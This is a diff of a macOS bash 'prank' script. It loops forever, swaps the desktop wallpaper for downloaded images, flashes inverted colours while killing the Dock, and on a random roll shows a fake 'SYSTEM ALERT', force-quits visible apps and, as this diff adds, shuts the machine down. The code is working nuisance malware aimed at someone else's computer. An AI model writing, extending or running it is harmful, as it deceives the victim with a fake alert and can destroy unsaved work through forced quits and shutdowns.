@@ -7,29 +7,25 @@ wallpapers=(
 "https://i1.sndcdn.com/avatars-zaCUjzWzmpQ5cqzn-4EqdxQ-t1080x1080.jpg"
 )
 
-# Loop forever
-while true; do
-  sleep $((RANDOM % 60 + 30))
-
-  # Random wallpaper
+# Define the prank function
+run_prank_cycle() {
+  # Change wallpaper
   wp="${wallpapers[$RANDOM % ${#wallpapers[@]}]}"
   curl -s -o /tmp/prank.jpg "$wp"
   osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/tmp/prank.jpg"'
 
-  # Quick invert flash
+  # Invert flash
   defaults write com.apple.universalaccess invertDisplay -bool true
   killall Dock
   sleep 0.2
   defaults write com.apple.universalaccess invertDisplay -bool false
   killall Dock
 
-  # Roll for rare glitch trigger
+  # Rare glitch trigger
   roll=$((RANDOM % 100 + 1))
   if [ "$roll" -eq 100 ]; then
-    # Alert popup
     osascript -e 'display dialog "You have angered King Von." with title "⚠️ SYSTEM ALERT" buttons {"Close"} with icon stop'
 
-    # Glitch flicker
     for i in {1..10}; do
       defaults write com.apple.universalaccess invertDisplay -bool true
       killall Dock
@@ -39,12 +35,23 @@ while true; do
       sleep 0.1
     done
 
-    # Close all visible apps except Terminal
+    # Close all apps except Terminal and Finder
     apps=$(osascript -e 'tell application "System Events" to get name of (every process whose background only is false)')
     for app in $apps; do
       if [[ "$app" != "Terminal" && "$app" != "Finder" ]]; then
         osascript -e "try" -e "quit app \"$app\"" -e "end try"
+        osascript -e 'tell application "System Events" to shut down'
       fi
     done
   fi
+}
+
+# Run immediately once on start
+run_prank_cycle
+
+# Then loop forever with random delay
+while true; do
+  sleep $((RANDOM % 60 + 30))
+  run_prank_cycle
 done
+   
